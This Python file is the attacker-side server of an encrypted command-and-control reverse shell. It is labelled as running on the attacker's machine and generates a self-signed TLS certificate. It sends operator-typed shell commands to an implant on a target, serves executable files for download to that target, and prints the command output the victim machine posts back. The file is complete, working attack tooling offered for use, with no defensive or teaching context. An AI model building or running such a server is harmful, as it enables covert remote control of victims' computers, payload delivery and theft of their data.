#Server ----> runs on the attacker's machine

from http.server import BaseHTTPRequestHandler, HTTPServer
from OpenSSL import crypto, SSL
import ssl
from urllib.parse import parse_qs
import os,cgi,time
import argparse
import json

argparser = argparse.ArgumentParser()

argparser.add_argument('-p', '--port', help='Port for the server to listen to', type=int, required=True)

def cert_gen(
    emailAddress="john.dutton@yellowstone.com",
    commonName="John Dutton",
    countryName="US",
    localityName="Yellowstone",
    stateOrProvinceName="Montana",
    organizationName="Yellowstone Ranch",
    organizationUnitName="YSR",
    serialNumber=0,
    validityStartInSeconds=0,
    validityEndInSeconds=10*365*24*60*60,
    KEY_FILE = "priv_key.pem",
    CERT_FILE="cert.pem"):
    #can look at generated file using openssl:
    #openssl x509 -inform pem -in selfsigned.crt -noout -text
    # create a key pair
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, 4096)
    # create a self-signed cert
    cert = crypto.X509()
    cert.get_subject().C = countryName
    cert.get_subject().ST = stateOrProvinceName
    cert.get_subject().L = localityName
    cert.get_subject().O = organizationName
    cert.get_subject().OU = organizationUnitName
    cert.get_subject().CN = commonName
    cert.get_subject().emailAddress = emailAddress
    cert.set_serial_number(serialNumber)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(validityEndInSeconds)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(k)
    cert.sign(k, 'sha512')
    with open(CERT_FILE, "wt") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
    with open(KEY_FILE, "wt") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))

# IP and port the HTTP server listens on (will be queried by client.py)
ATTACKER_IP = '0.0.0.0'
ATTACKER_PORT = int(argparser.parse_args().port)
wdir = "/"

class MyHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    # Send command to client (on Target)
    def do_GET(self):
        global wdir
        #Serving files (only in root directory of server.py)
        if(len(self.path) > 2 and self.path.count('/') == 1):
            self.send_response(200)
            self.send_header('Content-type', 'application/exe')
            self.send_header('Content-Disposition', 'attachment')
            self.end_headers()
            try:
                with open(self.path.replace('/',''), 'rb') as file: 
                    self.wfile.write(file.read()) # Read the file and send the contents
            except Exception as e:
                print(e)
        else:
            command = input(f"{wdir} > ")
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("Date", time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.localtime()))
            self.end_headers()
            data = json.dumps({"command": command, "wdir" : wdir})
            self.wfile.write(data.encode())

    def do_POST(self):
        global wdir
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Date", time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.localtime()))
        self.end_headers()
        data = parse_qs(self.rfile.read(length).decode())
        if "rfile" in data:
            print(data["rfile"][0])
        if "wdir" in data:
            wdir = data["wdir"][0]

if __name__ == '__main__':
    cert_gen()
    key_pem = "priv_key.pem"
    cert_pem = "cert.pem"
    myServer = HTTPServer((ATTACKER_IP, ATTACKER_PORT), MyHandler)
    myServer.socket = ssl.wrap_socket(myServer.socket, keyfile=key_pem, certfile=cert_pem, server_side=True)

    try:
        print(f'[*] Server started on {ATTACKER_IP}:{ATTACKER_PORT}')
        myServer.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        myServer.server_close()